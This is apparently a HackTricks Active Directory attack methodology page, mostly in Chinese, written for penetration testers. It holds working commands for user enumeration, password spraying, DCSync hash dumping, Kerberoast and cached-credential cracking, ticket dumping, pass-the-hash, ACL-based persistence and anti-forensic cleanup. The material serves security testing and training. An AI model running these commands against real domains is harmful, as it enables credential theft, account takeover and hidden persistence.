# Active Directory 方法论

{{#include ../../banners/hacktricks-training.md}}

## 基本概述

**Active Directory** 是一项基础技术，使得 **网络管理员** 能够高效地在网络内创建和管理 **域**、**用户** 和 **对象**。它被设计为可扩展的，便于将大量用户组织成可管理的 **组** 和 **子组**，并在不同层级上控制 **访问权限**。

**Active Directory** 的结构由三层主要架构组成：**域**、**树** 和 **林**。一个 **域** 包含一组对象，例如 **用户** 或 **设备**，这些对象共享一个公共数据库。**树** 是由具有共同结构的多个域组成的组，**林** 则是多个树的集合，这些树通过 **trust relationships** 相互连接，构成组织结构的最上层。可以在每个层级上指定特定的 **访问** 和 **通信 权限**。

Active Directory 中的关键概念包括：

1. **Directory** – 存放与 Active Directory 对象相关的所有信息的存储区。
2. **Object** – 指目录中的实体，包括 **用户**、**组** 或 **共享文件夹**。
3. **Domain** – 作为目录对象的容器，多个域可以共存于一个 **forest** 中，每个域维护自己的对象集合。
4. **Tree** – 共享根域的域的分组。
5. **Forest** – Active Directory 中组织结构的顶层，由多个具有 **trust relationships** 的树组成。

**Active Directory Domain Services (AD DS)** 包含一系列对集中管理和网络内通信至关重要的服务。这些服务包括：

1. **Domain Services** – 集中数据存储并管理 **用户** 与 **域** 之间的交互，包括身份验证和搜索功能。
2. **Certificate Services** – 管理安全 **数字证书** 的生成、分发与生命周期。
3. **Lightweight Directory Services** – 通过 **LDAP protocol** 支持启用目录的应用程序。
4. **Directory Federation Services** – 提供 **single-sign-on** 能力，使用户可在单次会话中跨多个 web 应用进行认证。
5. **Rights Management** – 帮助保护受版权保护的材料，控制其未经授权的分发和使用。
6. **DNS Service** – 对 **域名** 解析至关重要。

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

To learn how to **attack an AD** you need to **understand** really good the **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## 速查表

你可以访问 [https://wadcoms.github.io/](https://wadcoms.github.io) 快速查看可用于枚举/利用 AD 的常用命令。

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

如果你只对 AD 环境有访问能力但没有任何凭证/会话，你可以：

- **Pentest the network:**
- 扫描网络，查找主机和开放端口，并尝试 **exploit vulnerabilities** 或从中 **extract credentials**（例如，[printers could be very interesting targets](ad-information-in-printers.md)）。
- 枚举 DNS 可以提供有关域内关键服务器的信息，如 web、printers、shares、vpn、media 等。
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- 查阅 General [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) 以获取关于如何执行这些操作的更多信息。
- **Check for null and Guest access on smb services**（这在现代 Windows 版本上通常不可行）:
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- 有关如何枚举 SMB 服务器的更详细指南在这里：


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- 有关如何枚举 LDAP 的更详细指南在这里（请对匿名访问 **特别注意**）:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- 通过 [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) 来收集凭证
- 通过 [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) 访问主机
- 通过暴露 [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) 来收集凭证
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- 从内部文档、社交媒体、服务（主要是 web）以及公开可用资源中提取用户名/姓名。
- 如果你找到了公司员工的全名，可以尝试不同的 AD **username conventions**（[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)）。最常见的命名约定有：_NameSurname_、_Name.Surname_、_NamSur_（各取 3 个字母）、_Nam.Sur_、_NSurname_、_N.Surname_、_SurnameName_、_Surname.Name_、_SurnameN_、_Surname.N_、3 个 **random letters and 3 random numbers**（abc123）。
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### 用户枚举

- **Anonymous SMB/LDAP enum:** 请查看 [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) 和 [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) 页面。
- **Kerbrute enum**: 当请求一个 **invalid username** 时，服务器会以 **Kerberos error** 代码 _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ 响应，从而让我们判断该用户名无效。**Valid usernames** 会收到 AS-REP 中的 **TGT** 响应，或返回错误 _KRB5KDC_ERR_PREAUTH_REQUIRED_，表示该用户需要执行 pre-authentication。
- **No Authentication against MS-NRPC**: 对域控制器上的 MS-NRPC (Netlogon) 接口使用 auth-level = 1（无认证）。该方法在绑定 MS-NRPC 接口后调用 `DsrGetDcNameEx2` 函数，以在不使用任何凭证的情况下检查用户或计算机是否存在。NauthNRPC 工具实现了此类枚举。相关研究可见 [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

如果在网络中发现这些服务器之一，你也可以对其执行 **user enumeration**。例如，你可以使用工具 [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, you should have the **name of the people working on the company** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### 已知一个或多个用户名

Ok, so you know you have already a valid username but no passwords... Then try:

- [**ASREPRoast**](asreproast.md): 如果用户**没有**属性 _DONT_REQ_PREAUTH_，你可以**请求一个 AS_REP message** 给该用户，该消息将包含一些由该用户密码派生并加密的数据。
- [**Password Spraying**](password-spraying.md): 对每个发现的用户尝试最常见的**密码**，也许有用户在使用弱密码（注意密码策略！）。
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

你可能能够通过对网络的某些协议进行 poisoning 来获取一些可供破解的 **challenge hashes**：


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

If you have managed to enumerate the active directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  to get access to the AD env.

### NetExec workspace-driven recon & relay posture checks

- Use **`nxcdb` workspaces** to keep AD recon state per engagement: `workspace create <name>` spawns per-protocol SQLite DBs under `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Switch views with `proto smb|mssql|winrm` and list gathered secrets with `creds`. Manually purge sensitive data when done: `rm -rf ~/.nxc/workspaces/<name>`.
- Quick subnet discovery with **`netexec smb <cidr>`** surfaces **domain**, **OS build**, **SMB signing requirements**, and **Null Auth**. Members showing `(signing:False)` are **relay-prone**, while DCs often require signing.
- Generate **hostnames in /etc/hosts** straight from NetExec output to ease targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- 当 **SMB relay to the DC is blocked** by signing 时，仍应探测 **LDAP** 的 posture：`netexec ldap <dc>` 会突出显示 `(signing:None)` / 弱 channel binding。要求 SMB signing 但禁用 LDAP signing 的 DC 仍然是一个可利用的 **relay-to-LDAP** 目标，可用于像 **SPN-less RBCD** 这样的滥用。

### Client-side 打印机 凭证 leaks → 批量域凭证验证

- 打印机/web UIs 有时会在 HTML 中**嵌入被掩码的管理员密码**。查看 source/devtools 可以暴露明文（例如 `<input value="<password>">`），从而允许通过 Basic-auth 访问扫描/打印 存储库。
- 检索到的打印任务可能包含带有每用户密码的**明文入职文档**。测试时保持配对一致：
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### 窃取 NTLM 凭证

如果你可以使用 **null or guest user** 访问其他 PC 或共享，你可以放置文件（例如 SCF 文件），当这些文件被访问时会触发针对你的 **NTLM authentication**，从而让你能够**窃取** **NTLM challenge** 以便破解它：


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** 将你已有的每个 NT hash 视为其他更慢格式（其密钥材料直接由 NT hash 导出）的候选密码。与其在 Kerberos RC4 票证、NetNTLM 挑战或 cached credentials 上对长口令进行暴力破解，不如把 NT hashes 提供给 Hashcat 的 NT-candidate 模式，让它在不知道明文的情况下验证密码复用。在域被攻陷后你能收集到数千个当前和历史 NT hashes，这种方法尤其有效。

在以下情况使用 shucking：

- 你有来自 DCSync、SAM/SECURITY 转储或 credential vaults 的 NT 集合，需要测试它们在其他域/forest 中的复用情况。
- 你捕获了基于 RC4 的 Kerberos 材料（`$krb5tgs$23$`、`$krb5asrep$23$`）、NetNTLM 响应或 DCC/DCC2 blob。
- 你想快速证明长且难以破解的口令被复用，并立即通过 Pass-the-Hash 进行横向移动。

该技术**不起作用**于其密钥不是由 NT hash 派生的加密类型（例如 Kerberos etype 17/18 AES）。如果域强制只使用 AES，你必须回退到常规的密码模式。

#### Building an NT hash corpus

- **DCSync/NTDS** – 使用 `secretsdump.py` 带上历史记录选项以尽可能抓取更多的 NT hashes（及其历史值）：

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

历史条目会大幅扩大候选池，因为 Microsoft 每个账户最多可存储 24 个以前的 hash。有关更多收集 NTDS secrets 的方法，请参见：

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa`（或 Mimikatz `lsadump::sam /patch`）可提取本地 SAM/SECURITY 数据和缓存的域登录（DCC/DCC2）。去重并将这些 hashes 附加到同一 `nt_candidates.txt` 列表中。
- **跟踪元数据** – 保留产生每个 hash 的用户名/域（即使字典只包含十六进制）。一旦 Hashcat 打印出胜出候选，匹配的 hash 会立即告诉你哪个主体在复用密码。
- 优先使用来自相同 forest 或受信任 forest 的候选；这会最大化 shucking 时的重叠机会。

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

注意：

- NT-candidate 输入**必须保持原始的 32 十六进制 NT hashes**。禁用规则引擎（不要使用 `-r`，不要使用混合模式），因为字符串变形会破坏候选密钥材料。
- 这些模式本身并不更快，但 NTLM 的密钥空间（在 M3 Max 上约为 30,000 MH/s）比 Kerberos RC4（约 300 MH/s）快约 100 倍。在慢格式中测试一个精选的 NT 列表远比探索整个密码空间便宜得多。
- 始终运行 **最新的 Hashcat 构建**（`git clone https://github.com/hashcat/hashcat && make install`），因为模式 31500/31600/35300/35400 是最近才加入的。
- 目前没有针对 AS-REQ Pre-Auth 的 NT 模式，且 AES etypes（19600/19700）需要明文密码，因为它们的密钥由 UTF-16LE 密码通过 PBKDF2 派生，而不是原始 NT hashes。

#### Example – Kerberoast RC4 (mode 35300)

1. 使用低权限用户捕获目标 SPN 的 RC4 TGS（详情见 Kerberoast 页面）：

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. 使用你的 NT 列表对票证进行 shuck：

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat 会从每个 NT candidate 派生 RC4 密钥并验证 `$krb5tgs$23$...` blob。匹配确认该服务账户使用了你已有的某个 NT hash。

3. 立即通过 PtH 横向移动：

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

你也可以在之后使用 `hashcat -m 1000 <matched_hash> wordlists/` 可选地恢复明文。

#### Example – Cached credentials (mode 31600)

1. 从被占领的工作站转储缓存的登录信息：

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. 将感兴趣域用户的 DCC2 行复制到 `dcc2_highpriv.txt` 并进行 shuck：

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. 成功匹配会生成已经在你列表中已知的 NT hash，证明该缓存用户在复用密码。直接用于 PtH（`nxc smb <dc_ip> -u highpriv -H <hash>`）或在快速 NTLM 模式下离线暴力破解以恢复明文。

相同的工作流适用于 NetNTLM challenge-response（`-m 27000/27100`）和 DCC（`-m 31500`）。一旦识别出匹配，你可以发起 relay、SMB/WMI/WinRM PtH，或在离线环境中用掩码/规则重新破解 NT hash。

## 在拥有凭证/会话的情况下枚举 Active Directory

在此阶段你需要已经**攻破了有效域账户的凭证或会话**。如果你有一些有效凭证或以域用户的 shell，**请记住之前提到的那些选项仍然可用于攻破其他用户**。

在开始认证枚举之前，你应该了解 **Kerberos double hop problem**。


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

获取一个账户的控制权是**开始攻破整个域的重要一步**，因为你将能够启动 **Active Directory 枚举：**

关于 [**ASREPRoast**](asreproast.md) 你现在可以找到所有可能的易受攻击用户；关于 [**Password Spraying**](password-spraying.md) 你可以得到**所有用户名的列表**并尝试使用被攻破账户的密码、空密码或其他有希望的新密码。

- 你可以使用 [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- 你也可以使用 [**powershell for recon**](../basic-powershell-for-pentesters/index.html)，这会更隐蔽
- 你还可以使用 [**powerview**](../basic-powershell-for-pentesters/powerview.md) 提取更详细的信息
- 在 Active Directory 中另一个很棒的侦察工具是 [**BloodHound**](bloodhound.md)。它**不太隐蔽**（取决于你使用的收集方法），但**如果你不在乎被发现**，强烈推荐尝试。查找用户可 RDP 的位置，找到通向其他组的路径等。
- **其他自动化 AD 枚举工具：** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**AD 的 DNS 记录**](ad-dns-records.md) 可能包含有趣信息。
- 一个带 GUI 的目录枚举工具是来自 SysInternal Suite 的 **AdExplorer.exe**。
- 你也可以使用 **ldapsearch** 在 LDAP 数据库中搜索 _userPassword_ & _unixUserPassword_ 字段，或者搜索 _Description_ 字段以查找凭据。参见 PayloadsAllTheThings 的 [Password in AD User comment](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) 获取其他方法。
- 如果你使用 **Linux**，也可以使用 [**pywerview**](https://github.com/the-useless-one/pywerview) 来枚举域。
- 你还可以尝试一些自动化工具：
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **提取所有域用户**

从 Windows 很容易获得所有域用户名（`net user /domain`、`Get-DomainUser` 或 `wmic useraccount get name,sid`）。在 Linux 下，你可以使用：`GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` 或 `enum4linux -a -u "user" -p "password" <DC IP>`

> 即便这个 Enumeration 部分看起来很短，它其实是最重要的部分。请访问这些链接（主要是 cmd、powershell、powerview 和 BloodHound），学习如何枚举域并反复练习直到熟练。在评估过程中，这将是找到通往 DA 的关键时刻，或者决定无法进一步行动的关键判断点。

### Kerberoast

Kerberoasting 包括获取与用户账户绑定的 **TGS tickets** 并离线破解它们的加密 — 这类加密基于用户密码。

更多内容见：


{{#ref}}
kerberoast.md
{{#endref}}

### 远程连接 (RDP, SSH, FTP, Win-RM, etc)

一旦你获得了一些凭证，可以检查是否能访问任何一台 **机器**。为此，你可以使用 **CrackMapExec** 根据端口扫描结果尝试通过不同协议连接多个服务器。

### 本地权限提升

如果你以普通域用户的凭证或会话入侵并且以该用户身份对域内任意 **机器** 有 **访问权限**，你应该尝试在本地提升权限并搜集凭据。只有在获得本地管理员权限后，你才能**转储内存中的其他用户哈希**（LSASS）和本地（SAM）。

本书中有一整页关于 [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) 的内容和一份 [**checklist**](../checklist-windows-privilege-escalation.md)。另外别忘了使用 [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)。

### 当前会话票证

在当前用户下找到可以让你访问意外资源的 **tickets** 的可能性非常**低**，但你仍可以检查：
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

If you have managed to enumerate the Active Directory you will have **更多的邮箱地址并且更好地了解网络**。You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### 在 Computer Shares 中查找 Creds | SMB Shares

现在你有了一些基本凭证，你应该检查是否可以 **找到** 在 AD 内 **共享的任何有趣文件**。你可以手动完成这项工作，但这是一项非常无聊且重复的任务（如果你发现数百份需要检查的文档则更甚）。

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

If you can **access other PCs or shares** you could **place files** (like a SCF file) that if somehow accessed will **触发针对你的 NTLM authentication** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

该漏洞允许任何经过身份验证的用户**危及域控制器**。


{{#ref}}
printnightmare.md
{{#endref}}

## 在 Active Directory 上使用特权凭证/会话进行权限提升

**对于以下技术，普通域用户是不够的，你需要一些特殊权限/凭证来执行这些攻击。**

### Hash extraction

希望你已经设法使用 [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) 包括 relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html) 等方法**攻破了一些 local admin 帐户**。\
然后，是时候转储内存和本地的所有哈希了。\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**一旦你获得了某个用户的 hash**，你就可以用它来**冒充**该用户。\
你需要使用某个**工具**来**使用该 hash 执行 NTLM 认证**，**或者**你可以创建一个新的 **sessionlogon** 并将该 **hash 注入到 LSASS** 中，这样当执行任何 **NTLM authentication** 时，就会使用该 **hash**。最后一种方式就是 mimikatz 所做的。\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

此攻击旨在**使用用户的 NTLM hash 请求 Kerberos tickets**，作为常见的通过 NTLM 协议的 Pass The Hash 的替代方法。因此，在 NTLM 协议被禁用且仅允许 Kerberos 作为认证协议的网络中，这尤其**有用**。


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

在 **Pass The Ticket (PTT)** 攻击方法中，攻击者**窃取用户的认证票证**，而不是他们的密码或哈希值。然后使用该被窃取的票证来**冒充用户**，从而在网络内获得对资源和服务的未授权访问。


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

If you have the **hash** or **password** of a **local administrator** you should try to **login locally** to other **PCs** with it.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> 注意这会产生相当大的 **噪音**，**LAPS** 可以 **缓解** 它。

### MSSQL Abuse & Trusted Links

如果某个用户有权限 **访问 MSSQL 实例**，他可能能够利用它在 MSSQL 主机上 **执行命令**（如果以 SA 身份运行）、**窃取** NetNTLM **hash** 或甚至执行 **relay** **attack**。\
此外，如果一个 MSSQL 实例被另一个 MSSQL 实例信任（database link）。如果该用户对受信任的数据库拥有权限，他将能够 **利用信任关系在另一个实例中执行查询**。这些信任可以被串联，最终用户可能会找到一个配置错误的数据库，在那里可以执行命令。\
**数据库之间的链接甚至可以跨越 forest trusts。**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

第三方的资产清单和部署套件通常会暴露可以访问凭据和执行代码的强大路径。参见：

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

如果你找到任何 Computer 对象具有属性 [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) 并且你在该计算机上拥有域权限，你将能够从每个登录到该计算机的用户的内存中转储 TGT。\
因此，如果 **Domain Admin 登录到该计算机**，你将能够转储他的 TGT 并使用 [Pass the Ticket](pass-the-ticket.md) 冒充他。\
得益于 constrained delegation，你甚至可以 **自动危及一个 Print Server**（希望它不是 DC）。

{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

如果某个用户或计算机被允许使用 "Constrained Delegation"，它将能够 **冒充任何用户以访问某台计算机上的某些服务**。\
然后，如果你**破解了该用户/计算机的 hash**，你将能够 **冒充任何用户**（甚至是 domain admins）以访问某些服务。

{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

对远程计算机的 Active Directory 对象具有 **WRITE** 权限可使你获得具有 **提升权限** 的代码执行：

{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

被攻破的用户可能在某些域对象上拥有一些**有趣的权限**，这可能让你随后进行横向移动/**提权**。

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

在域内发现有 **Spool 服务监听** 时，可以被 **滥用** 来 **获取新凭据** 并 **提升权限**。

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

如果 **其他用户** **访问** 被 **攻破** 的机器，可能从内存中 **收集凭据**，甚至 **在他们的进程中注入 beacons** 来冒充他们。\
通常用户会通过 RDP 访问系统，这里是对第三方 RDP 会话执行几种攻击的方法：

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** 提供了一个管理域加入计算机上 **本地 Administrator 密码** 的系统，确保其 **随机化**、唯一且经常**更改**。这些密码存储在 Active Directory 中，访问受 ACL 控制，仅授权用户可访问。拥有足够权限读取这些密码即可实现向其他计算机的 pivot。

{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

从被攻破的机器 **收集证书** 可能是提升环境内权限的一种方式：

{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

如果配置了 **易受攻击的 templates**，可以滥用它们进行提权：

{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

一旦获取 **Domain Admin** 或更高的 **Enterprise Admin** 权限，你可以 **转储** **域数据库**：_ntds.dit_。

[**关于 DCSync 攻击的更多信息请见此处**](dcsync.md)。

[**关于如何窃取 NTDS.dit 的更多信息请见此处**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

之前讨论的一些技术可以用于持久化。\
例如你可以：

- 使用户易受 [**Kerberoast**](kerberoast.md) 攻击

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- 使用户易受 [**ASREPRoast**](asreproast.md) 攻击

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- 授予用户 [**DCSync**](#dcsync) 权限

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** 使用 **NTLM hash**（例如 **PC account 的 hash**）为特定服务创建一个合法的 Ticket Granting Service (TGS) ticket。此方法用于 **获取该服务的访问权限**。

{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** 涉及攻击者获取 Active Directory 环境中 **krbtgt 账户的 NTLM hash**。该账户用于签署所有 **Ticket Granting Tickets (TGTs)**，TGT 对在 AD 网络中的认证至关重要。

一旦攻击者获得该 hash，他们可以为任何账户创建 **TGTs**（即 Silver ticket 攻击的原理）。

{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

这类票据类似于 golden tickets，但以能够 **绕过常见 golden tickets 检测机制** 的方式伪造。

{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**拥有账户的证书或能够请求它们** 是在用户账户中保持持久化的一个很好方式（即使用户修改了密码也能继续使用）：

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**使用证书也可以在域内以高权限保持持久化：**

{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory 中的 **AdminSDHolder** 对象通过在这些组上应用标准的 **Access Control List (ACL)** 来保护 **特权组**（例如 Domain Admins 和 Enterprise Admins），以防止未授权更改。然而，该功能可能被滥用；如果攻击者修改 AdminSDHolder 的 ACL，将完全访问权限授予普通用户，则该用户将获得对所有特权组的广泛控制。这个旨在保护的安全措施如果不被严格监控，反而可能导致未经授权的访问。

[**关于 AdminDSHolder Group 的更多信息请见此处。**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

在每个 **Domain Controller (DC)** 内，存在一个 **本地管理员** 账号。通过在这样的机器上获得管理员权限，可以使用 **mimikatz** 提取本地 Administrator 的 hash。随后需要修改注册表以 **启用使用该密码**，从而允许远程访问本地 Administrator 账号。

{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

你可以向某个 **用户** 授予对某些特定域对象的 **特殊权限**，这将允许该用户在将来 **提升权限**。

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**security descriptors** 用于 **存储** 对象对另一个 **对象** 的 **权限**。如果你只是对对象的 **security descriptor** 做一点小改动，你就可以在不成为特权组成员的情况下，获得对该对象非常有价值的权限。

{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

滥用 `dynamicObject` 辅助类来创建具有 `entryTTL`/`msDS-Entry-Time-To-Die` 的短生命周期 principals/GPOs/DNS 记录；它们会在没有 tombstones 的情况下自我删除，从而抹去 LDAP 证据，同时留下孤立的 SIDs、损坏的 `gPLink` 引用或缓存的 DNS 响应（例如，AdminSDHolder ACE 污染或恶意的 `gPCFileSysPath`/AD-integrated DNS 重定向）。

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

